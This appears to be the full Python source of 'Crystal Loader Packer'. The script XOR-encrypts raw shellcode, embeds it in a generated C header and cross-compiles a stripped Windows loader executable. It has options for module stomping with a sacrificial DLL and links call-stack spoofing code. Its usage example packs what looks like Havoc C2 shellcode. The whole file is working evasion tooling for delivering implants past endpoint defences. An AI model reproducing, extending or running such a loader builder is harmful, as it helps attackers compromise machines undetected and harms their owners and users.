#!/usr/bin/env python3
"""
Crystal Loader Packer
Embeds XOR-encrypted shellcode into a standalone .exe

Usage:
    python3 packer.py <shellcode.bin> [-o output.exe] [-d dll_path] [-k keylen]

Examples:
    python3 packer.py havoc.bin -o bicho.exe
    python3 packer.py calc.bin -o calc_loader.exe -d "C:\\Windows\\System32\\xpsservices.dll"
"""

import sys
import os
import struct
import argparse
import subprocess
import secrets

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def generate_payload_header(shellcode: bytes, key: bytes, outpath: str):
    encrypted = xor_encrypt(shellcode, key)

    with open(outpath, "w") as f:
        f.write("#pragma once\n")
        f.write(f"// Encrypted shellcode — {len(shellcode)} bytes, {len(key)}-byte XOR key\n\n")

        # encrypted shellcode
        f.write(f"static unsigned char sc_encrypted[] = {{\n")
        for i in range(0, len(encrypted), 16):
            chunk = encrypted[i:i+16]
            line = ", ".join(f"0x{b:02x}" for b in chunk)
            f.write(f"    {line},\n")
        f.write("};\n\n")

        # xor key
        f.write(f"static unsigned char sc_key[] = {{\n")
        for i in range(0, len(key), 16):
            chunk = key[i:i+16]
            line = ", ".join(f"0x{b:02x}" for b in chunk)
            f.write(f"    {line},\n")
        f.write("};\n\n")

        f.write(f"static unsigned int sc_size    = {len(shellcode)};\n")
        f.write(f"static unsigned int sc_key_len = {len(key)};\n")

def build(output: str, stomp_dll: str | None):
    obj_path = os.path.join(SCRIPT_DIR, "draugr.obj")
    payload_h = os.path.join(SCRIPT_DIR, "payload.h")

    # assemble draugr if .obj doesn't exist or .asm is newer
    asm_path = os.path.join(SCRIPT_DIR, "draugr.asm")
    if not os.path.exists(obj_path) or \
       os.path.getmtime(asm_path) > os.path.getmtime(obj_path):
        print("[*] Assembling draugr.asm...")
        ret = subprocess.run(
            ["nasm", "-f", "win64", asm_path, "-o", obj_path],
            capture_output=True, text=True)
        if ret.returncode != 0:
            print(f"[-] nasm failed:\n{ret.stderr}")
            sys.exit(1)

    # compile
    print("[*] Compiling...")
    cmd = [
        "x86_64-w64-mingw32-g++",
        "-Wall", "-O2", "-std=c++17", "-Wno-pointer-arith",
        "-DEMBEDDED_PAYLOAD",
        os.path.join(SCRIPT_DIR, "crystal_loader.cpp"),
        os.path.join(SCRIPT_DIR, "spoof.cpp"),
        obj_path,
        "-o", output,
        "-s",
    ]
    if stomp_dll:
        escaped = stomp_dll.replace("\\", "\\\\")
        cmd.insert(4, f'-DSTOMP_DLL=L"{escaped}"')

    ret = subprocess.run(cmd, capture_output=True, text=True)
    if ret.returncode != 0:
        print(f"[-] Compilation failed:\n{ret.stderr}")
        sys.exit(1)

    # cleanup generated header
    if os.path.exists(payload_h):
        os.remove(payload_h)

    size = os.path.getsize(output)
    print(f"[+] {output} ({size} bytes)")

def main():
    parser = argparse.ArgumentParser(description="Crystal Loader Packer")
    parser.add_argument("shellcode", help="Path to raw shellcode .bin")
    parser.add_argument("-o", "--output", default="loader.exe",
                        help="Output executable (default: loader.exe)")
    parser.add_argument("-d", "--dll", default=None,
                        help="Sacrificial DLL path for module stomping")
    parser.add_argument("-k", "--keylen", type=int, default=128,
                        help="XOR key length in bytes (default: 128)")
    args = parser.parse_args()

    if not os.path.exists(args.shellcode):
        print(f"[-] File not found: {args.shellcode}")
        sys.exit(1)

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    print(f"[*] Crystal Loader Packer")
    print(f"    Shellcode: {args.shellcode} ({len(shellcode)} bytes)")
    print(f"    Output:    {args.output}")
    print(f"    Key size:  {args.keylen} bytes")
    if args.dll:
        print(f"    Stomp DLL: {args.dll}")

    # generate random key and encrypt
    key = secrets.token_bytes(args.keylen)
    payload_h = os.path.join(SCRIPT_DIR, "payload.h")
    generate_payload_header(shellcode, key, payload_h)
    print(f"[+] Payload encrypted and embedded")

    # build
    build(args.output, args.dll)

if __name__ == "__main__":
    main()
